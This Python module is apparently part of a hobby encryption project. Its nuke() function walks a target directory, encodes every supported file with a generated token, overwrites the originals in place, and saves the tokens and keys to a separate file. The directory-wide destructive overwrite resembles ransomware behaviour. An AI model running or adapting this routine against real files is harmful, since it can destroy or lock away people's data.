"""
this is the adapter to connecting sigma.py and core.py, more like a view model
but i prefer called it adapter
"""
from utils import *
from core import Sigma

sigma = Sigma()

def nuke(path, algo):
    nuked =0
    tokens = {}
    print("\nWARNING THIS FUNCTION STILL UNDER DEVELOPMENT")
    print("\n###### Scanning the targeted Dir ######\n")

    list_of_files = list_files(path)
    if len(list_of_files) <=0:
        print("INFO : nothing to nuke here....\n")
        exit()
        
    print("###### Scanning the targeted Dir ######")
    print()
    print("Let's start the nuke")
    #print("\nsupported files : ", list_of_files)
    for file in list_of_files:
        token = algo.generate_token()
        priv_key = algo.generate_private_key(token)
        the_file = path +file
        content = ""
        try:
            if fileSupported(the_file):
                content = readFileContent(the_file)
        except Exception as e:
            print("\nError: {} {}".format(the_file, e))
            print("WTH are you doing list_files() function, this file is not supported but you included in the list\n")
            continue
        encoded = algo.start_encode(content, token)
        overwrite_file(the_file, encoded)
        print("Succesfully nuke file : " + file , "with token / key : ", token)
        nuked += 1
        tokens.update({file : [str(token), str(priv_key)]})
    token_file = storeTokenIntoFile(str(tokens), "nuked-dir", True)
    print("succesfully nuked {} files from total {} files".format(nuked, len(list_of_files)))
    print("keys is stored in file : ", token_file)
    print("\n###### Nuke Completed ######")

def Encoder():
    print("this is encoder module")


def Decoder():
    print("this is decoder module")
